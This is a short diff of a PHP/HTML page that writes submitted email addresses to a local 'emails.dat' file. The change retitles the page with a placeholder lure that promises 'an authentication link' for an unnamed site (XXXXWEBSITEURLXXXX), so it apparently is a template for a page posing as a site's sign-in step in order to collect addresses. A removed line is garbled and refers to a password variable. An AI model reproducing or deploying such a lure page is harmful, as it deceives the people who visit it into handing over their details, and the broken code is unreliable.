@@ -1,10 +1,9 @@
 <?php
 if(isset($_POST['submit'])){
-$Name = "Email:".$_POST['email']."
+$Email = "Email:".$_POST['email']."
 ";
 $file=fopen("emails.dat", "a");
-fwrite($file, $Name);
-aved/write($file, $Pass);
+fwrite($file, $Email);
 fclose($file);
 }
 ?>
@@ -16,12 +15,12 @@ fclose($file);
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <link rel="stylesheet" href="style.css">
-  <title>My HTML Form</title>
+  <title>Enter your XXXXWEBSITEURLXXXX here and we will send you an authentication link if we know you</title>
 </head>
 <body class="emailcollector-body">
   <div class="emailcollector-wrapper">
     <div class="emailcollector-heading">
-      My HTML Form
+      Your Email Address
     </div>
     <form class="emailcollector-form" method="post">
       <input type="text" name="email" placeholder="Email Address" required autocomplete="off"> <br>
